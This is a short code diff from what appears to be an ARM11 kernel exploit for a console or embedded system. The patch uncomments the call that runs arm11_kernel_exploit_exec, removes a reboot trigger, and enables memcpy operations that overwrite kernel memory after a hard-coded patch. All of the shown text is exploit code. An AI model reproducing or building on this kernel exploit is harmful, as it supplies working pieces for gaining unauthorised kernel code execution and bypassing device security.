@@ -249,16 +249,14 @@ arm11_kernel_exec (void)
     *(int *)0x20046500 = 0xF00FF00F;
     *(int *)0x20046504 = 0xF00FF00F;
     *(int *)0x20410000 = 0xF00FF00F;
-    int (*sub_FFF748C4)(int, int, int, int) = 0xFFF748C4;
-    sub_FFF748C4(0, 0, 2, 0); // trigger reboot
 
     // fix up memory
     *(int *)0xEFF83C9F = 0x8DD00CE5;
     invalidate_icache ();
     invalidate_allcache ();
-    //memcpy(0xD848F000, 0xFFF00000, 0x00038400);
-    //memcpy(0xD84C7800, 0xFFF00000, 0x00038400);
-    //memcpy(0xE4410000, 0xFFFF0000, 0x1000);
+    memcpy(0xD848F000, 0xFFF00000, 0x00038400);
+    memcpy(0xD84C7800, 0xFFF00000, 0x00038400);
+    memcpy(0xE4410000, 0xFFFF0000, 0x1000);
     invalidate_dcache ();
 
     return 0;
@@ -319,7 +317,7 @@ int uvl_entry ()
         buf[0] = 0xDEADDEAD;
         printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
         printf("%x\n", buf[0]);
-        //arm11_kernel_exploit_exec (arm11_kernel_stub);
+        arm11_kernel_exploit_exec (arm11_kernel_stub);
         printf("%x\n", buf[0]);
         printf("ARM11 Kernel Code Executed\n");
     }
